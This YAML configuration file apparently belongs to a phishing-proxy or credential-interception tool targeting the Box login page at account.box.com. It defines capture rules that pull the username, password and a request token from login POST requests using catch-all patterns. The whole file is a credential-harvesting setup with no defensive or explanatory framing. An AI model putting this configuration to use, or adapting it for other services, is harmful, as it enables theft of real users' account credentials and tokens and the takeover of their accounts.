auth_urls:
  - '/'

credentials:
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
  custom:
    key: 'request_token'
    search: '(.*)'
    type: 'post'

login:
  domain: 'account.box.com'
  path: '/login'

